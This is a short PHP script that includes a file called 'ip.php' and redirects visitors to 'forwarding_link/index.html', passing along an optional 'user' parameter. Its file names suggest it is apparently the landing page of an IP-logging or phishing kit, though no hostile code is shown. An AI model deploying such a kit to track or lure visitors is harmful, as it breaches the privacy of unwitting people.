<?php
include 'ip.php';
$user = isset($_GET['user']) ? $_GET['user'] : '';
$redirect = 'forwarding_link/index.html';
if ($user !== '') {
    $redirect .= '?user=' . urlencode($user);
}
header('Location: ' . $redirect);
exit;
?>
